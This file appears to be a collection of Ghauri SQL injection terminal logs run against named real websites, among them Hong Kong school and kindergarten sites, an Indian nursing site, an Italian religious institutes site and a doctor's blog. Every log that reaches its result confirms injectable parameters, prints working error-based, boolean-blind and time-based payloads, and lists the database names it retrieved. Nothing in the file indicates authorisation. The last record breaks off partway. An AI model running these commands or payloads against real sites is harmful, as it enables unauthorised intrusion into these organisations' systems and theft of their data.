@@ -1,0 +1,2845 @@
+ghauri -u "https://www.kyc.edu.hk/en/news_detail.php?id=3" --dbs type = 
+
+( ──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://www.kyc.edu.hk/en/news_detail.php?id=3" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:06:59 /2025-11-29/
+
+[02:06:59] [INFO] testing connection to the target URL
+[02:07:01] [INFO] testing if the target URL content is stable
+[02:07:03] [INFO] target URL content is stable
+[02:07:04] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:07:04] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:07:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:07:31] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:07:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:08:00] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:09:30] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:09:31] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+[02:09:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:09:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[02:10:20] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="FROM")
+[02:10:20] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:10:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:10:34] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:10:48] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 52 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=3 AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW
+
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=3 OR NOT 07677=7677-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(5),0)
+---
+[02:11:03] [INFO] testing MySQL
+[02:11:03] [INFO] confirming MySQL
+[02:11:03] [INFO] the back-end DBMS is MySQL
+[02:11:03] [INFO] fetching database names
+[02:11:03] [INFO] fetching number of databases
+[02:11:05] [INFO] retrieved: 3
+[02:11:07] [INFO] retrieved: information_schema
+[02:11:09] [INFO] retrieved: performance_schema
+[02:11:11] [INFO] retrieved: kauyan_web
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] kauyan_web
+
+[02:11:11] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.kyc.edu.hk'
+
+[*] ending @ 02:11:11 /2025-11-29/
+
+
+)
+
+
+ghauri -u "https://kindergarten.pokoi.org.hk/YWY/en/gallery_detail.php?id=66" --dbs
+
+
+(
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://kindergarten.pokoi.org.hk/YWY/en/gallery_detail.php?id=66" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:07:41 /2025-11-29/
+
+[02:07:41] [INFO] testing connection to the target URL
+[02:07:43] [INFO] testing if the target URL content is stable
+[02:07:43] [INFO] target URL content is stable
+[02:07:44] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:07:44] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:08:13] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:08:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:08:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:08:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:08:35] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:08:41] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:08:46] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[02:08:56] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[02:09:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[02:09:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[02:09:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:09:14] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[02:09:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:09:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[02:09:16] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="ywyic")
+[02:09:16] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:09:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:09:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:09:32] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 124 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=66 AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wXyW
+
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=66 OR NOT 05064=5064-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(5),0)
+---
+[02:10:54] [INFO] testing MySQL
+[02:10:54] [INFO] confirming MySQL
+[02:10:54] [INFO] the back-end DBMS is MySQL
+[02:10:54] [INFO] fetching database names
+[02:10:54] [INFO] fetching number of databases
+[02:10:56] [INFO] retrieved: 4
+[02:10:57] [INFO] retrieved: information_schema
+[02:10:58] [INFO] retrieved: pokoikg5
+[02:10:59] [INFO] retrieved: test
+[02:11:00] [INFO] retrieved: test_demo
+available databases [4]:
+[*] pokoikg5
+[*] test_demo
+[*] information_schema
+[*] test
+
+[02:11:00] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/kindergarten.pokoi.org.hk'
+
+[*] ending @ 02:11:00 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+)
+
+
+
+─(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "http://www.kesine.in/www/about.php?id=68086b5ed546a&idd=68086b8280fee" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 04:13:26 /2025-11-29/
+
+[04:13:26] [INFO] testing connection to the target URL
+[04:13:29] [INFO] testing if the target URL content is stable
+[04:13:31] [INFO] target URL content is stable
+[04:13:32] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[04:13:32] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[04:13:49] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[04:14:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[04:14:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[04:14:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[04:14:42] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[04:14:55] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[04:15:08] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[04:15:23] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[04:15:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[04:15:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[04:16:03] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[04:16:07] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[04:16:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[04:16:09] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Nursing Con")
+[04:16:09] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[04:16:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[04:16:19] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[04:16:48] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 126 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=68086b5ed546a' AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wXyW&idd=68086b8280fee
+
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=68086b5ed546a' AND 05540=5540-- wXyW&idd=68086b8280fee
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=68086b5ed546a'XOR(if(now()=sysdate(),SLEEP(9),0))XOR'Z&idd=68086b8280fee
+---
+[04:19:12] [INFO] testing MySQL
+[04:19:12] [INFO] confirming MySQL
+[04:19:12] [INFO] the back-end DBMS is MySQL
+[04:19:12] [INFO] fetching database names
+[04:19:12] [INFO] fetching number of databases
+[04:19:12] [INFO] retrieved: 2
+[04:19:13] [INFO] retrieved: information_schema
+[04:19:14] [INFO] retrieved: nursing
+available databases [2]:
+[*] information_schema
+[*] nursing
+
+[04:19:14] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.kesine.in'
+
+[*] ending @ 04:19:14 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://www.istituti-religiosi.org/riepilogo.php?id=" --dbs 
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 03:36:31 /2025-11-29/
+
+[03:36:31] [INFO] testing connection to the target URL
+[03:36:32] [INFO] testing if the target URL content is stable
+[03:36:33] [INFO] target URL content is stable
+[03:36:33] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[03:36:33] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[03:36:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[03:36:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[03:37:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[03:37:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[03:37:16] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[03:37:22] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[03:37:29] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[03:37:35] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[03:37:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[03:37:49] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[03:37:55] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[03:38:02] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[03:38:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:38:09] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable
+[03:38:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:38:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[03:38:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[03:38:12] [INFO] testing 'Boolean-based blind - Parameter replace'
+[03:38:13] [INFO] GET parameter 'id' appears to be 'Boolean-based blind - Parameter replace' injectable (with --string="Tito")
+[03:38:13] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[03:39:00] [WARNING] in case of read timeout performing further tests to confirm if the detected payload is working..
+[03:40:23] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (query SLEEP)' injectable (with error ReadTimeout on --timeout=30)
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 148 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
+    Payload: id=UPDATEXML(0,CONCAT(0x7e,0x72306f746833783439,0x7e),0)
+
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace
+    Payload: id=(SELECT (CASE WHEN (06728=6728) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)
+    Payload: id=(SELECT(0)FROM(SELECT(SLEEP(8)))a)
+---
+[03:40:50] [INFO] testing MySQL
+[03:40:50] [INFO] confirming MySQL
+[03:40:50] [INFO] the back-end DBMS is MySQL
+[03:40:50] [INFO] fetching database names
+[03:40:50] [INFO] fetching number of databases
+[03:40:51] [INFO] retrieved: 2
+[03:40:52] [INFO] retrieved: information_schema
+[03:40:52] [INFO] retrieved: istituti_hjdf8j
+available databases [2]:
+[*] istituti_hjdf8j
+[*] information_schema
+
+[03:40:52] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.istituti-religiosi.org'
+
+[*] ending @ 03:40:52 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+
+
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ # Combine all speed tricks
+ghauri -u "https://drsrikantswain.in/blogs.php?id=3" \
+  --dbs \
+  --technique=B \
+  --dbms=mysql \
+  --timeout=60 \
+  --threads=10 \
+  --batch \
+  --delay=0 \
+  --time-sec=1
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 04:26:23 /2025-11-29/
+
+[04:26:23] [INFO] testing connection to the target URL
+Ghauri resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=3' AND 01502=1502-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (CASE STATEMENT)
+    Payload: id=3'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(5) ELSE 0 END)XOR'Z
+---
+[04:26:24] [INFO] testing MySQL
+[04:26:24] [INFO] confirming MySQL
+[04:26:24] [INFO] the back-end DBMS is MySQL
+[04:26:24] [INFO] fetching database names
+[04:26:24] [INFO] fetching number of databases
+[04:26:35] [INFO] retrieved: 2 
+[04:26:37] [INFO] resumed: information_schema 
+[04:26:37] [INFO] resumed: jexubtmn_database 
+available databases [2]:
+[*] information_schema
+[*] jexubtmn_database
+
+[04:26:37] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/drsrikantswain.in'
+
+[*] ending @ 04:26:37 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://www.skhsjtst.edu.hk/albums.php?id=9&time=2025-2026&page=0" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 03:25:59 /2025-11-29/
+
+[03:26:00] [INFO] testing connection to the target URL
+[03:26:02] [INFO] testing if the target URL content is stable
+[03:26:05] [INFO] target URL content is stable
+[03:26:08] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[03:26:08] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[03:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+y
+[03:27:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[03:27:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[03:28:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[03:28:42] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[03:29:11] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[03:29:42] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[03:30:11] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[03:30:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[03:31:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[03:31:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[03:31:40] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[03:31:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:31:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[03:32:05] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
+[03:32:05] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[03:32:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[03:32:29] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[03:33:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[03:33:45] [INFO] testing 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)'
+[03:33:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+[03:33:56] [INFO] testing for SQL injection on GET parameter 'time'
+[03:33:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[03:34:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[03:35:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[03:35:36] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[03:36:05] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[03:36:33] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[03:37:02] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[03:37:30] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[03:37:58] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[03:38:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[03:38:56] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[03:39:24] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[03:39:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:40:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[03:40:59] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:41:29] [INFO] testing 'MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:41:34] [INFO] GET parameter 'time' appears to be 'MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable
+[03:41:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:41:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[03:41:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[03:41:48] [INFO] testing 'Boolean-based blind - Parameter replace'
+[03:42:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[03:42:28] [INFO] testing 'boolean-based blind - WHERE or HAVING clause (CASE STATEMENT)'
+[03:42:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[03:42:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[03:42:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[03:42:47] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[03:42:52] [INFO] testing 'MySQL boolean-based blind - (IF STATEMENT)'
+[03:42:57] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[03:42:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[03:43:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[03:43:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[03:44:15] [INFO] testing 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)'
+[03:44:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)'
+[03:45:09] [INFO] testing 'MySQL >= 5.0.12 time-based blind (SLEEP)'
+GET parameter 'time' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 124 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=9 AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wXyW&time=2025-2026&page=0
+
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=9 OR NOT 09927=9927-- wXyW&time=2025-2026&page=0
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (CASE STATEMENT)
+    Payload: id=9"XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(5) ELSE 0 END)XOR"Z&time=2025-2026&page=0
+
+Parameter: time (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
